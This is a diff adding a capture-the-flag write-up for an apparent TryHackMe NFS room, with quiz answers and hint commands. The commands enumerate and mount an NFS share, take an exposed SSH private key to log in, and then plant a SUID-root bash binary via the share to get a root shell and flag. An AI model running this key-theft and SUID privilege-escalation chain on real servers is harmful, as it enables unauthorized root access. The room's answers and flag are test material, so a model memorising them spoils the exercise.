@@ -1,0 +1,102 @@
+#Task 2 Understanding NFS 
+- What does NFS stand for?
+Network File System
+
+- What process allows an NFS client to interact with a remote directory as though it was a physical device?
+mounting
+
+- What does NFS use to represent files and directories on the server?
+file handle
+
+
+- What protocol does NFS use to communicate between the server and client?
+RPC
+
+
+- What two pieces of user data does the NFS server take as parameters for controlling user permissions? Format: parameter 1 / parameter 2
+user id / group id
+
+- Can a Windows NFS server share files with a Linux client? (Y/N)
+Y
+
+- Can a Linux NFS server share files with a MacOS client? (Y/N)
+Y
+
+- What is the latest version of NFS? [released in 2016, but is still up to date as of 2020] This will require external research.
+hint: https://en.wikipedia.org/wiki/Network_File_System
+4.2
+
+
+#Task 3 Enumerating NFS 
+- Conduct a thorough port scan scan of your choosing, how many ports are open?
+hint: nmap -A -p- -Pn -vv $ip
+7
+
+
+- Which port contains the service we're looking to enumerate?
+2049
+
+
+- Now, use /usr/sbin/showmount -e [IP] to list the NFS shares, what is the name of the visible share?
+hint: #showmount -e $IP
+/home
+
+
+Time to mount the share to our local machine!
+First, use "mkdir /tmp/mount" to create a directory on your machine to mount the share to. This is in the /tmp directory- so be aware that it will be removed on restart.
+- Then, use the mount command we broke down earlier to mount the NFS share to your local machine. Change directory to where you mounted the share- what is the name of the folder inside?
+
+hint: cd /tmp/mount
+ls
+cappuchino
+
+
+- Interesting! Let's do a bit of research now, have a look through the folders. Which of these folders could contain keys that would give us remote access to the server?
+.ssh
+
+
+- Which of these keys is most useful to us?
+id_rsa
+
+
+- Copy this file to a different location your local machine, and change the permissions to "600" using "chmod 600 [file]".
+Assuming we were right about what type of directory this is, we can pretty easily work out the name of the user this key corresponds to.
+Can we log into the machine using ssh -i <key-file> <username>@<ip> ? (Y/N)
+hint:
+cd /tmp/mount/cappuchino
+cd .ssh
+cat id_rsa.pub
+ssh -i id_rsa cappuchino@ip
+Y
+
+
+#Task 4 Exploiting NFS 
+On local mounted machine target
+#wget https://raw.githubusercontent.com/polo-sec/writing/master/Security%20Challenge%20Walkthroughs/Networks%202/bash
+#cp bash /tmp/mount/cappuchino
+chown root bash
+chmod +s bash
+ls -l bash
+-rwSr-Sr-x 1 root root 1113504 Jul  4 23:12 bash
+
+
+- Now, we're going to add the SUID bit permission to the bash executable we just copied to the share using "sudo chmod +[permission] bash". What letter do we use to set the SUID bit set using chmod?
+s
+
+
+- Let's do a sanity check, let's check the permissions of the "bash" executable using "ls -la bash". What does the permission set look like? Make sure that it ends with -sr-x.
+-rwSr-Sr-x
+
+Now, SSH into the machine as the user. List the directory to make sure the bash executable is there. Now, the moment of truth. Lets run it with "./bash -p". The -p persists the permissions, so that it can run as root with SUID- as otherwise bash will sometimes drop the permissions.
+
+- Great! If all's gone well you should have a shell as root! What's the root flag?
+ssh -i id_rsa cappuchino@$ip
+./bash -p
+cat /root/root.txt
+THM{nfs_got_pwned}
+
+
+https://tryhackme.com/room/networkservices2
+https://fthcyber.com/2020/10/02/network-services-2-writeup-tryhackme/
+http://wuvel.net/network-services-2/
+https://jinshiranai.hashnode.dev/tryhackme-network-services-2-room
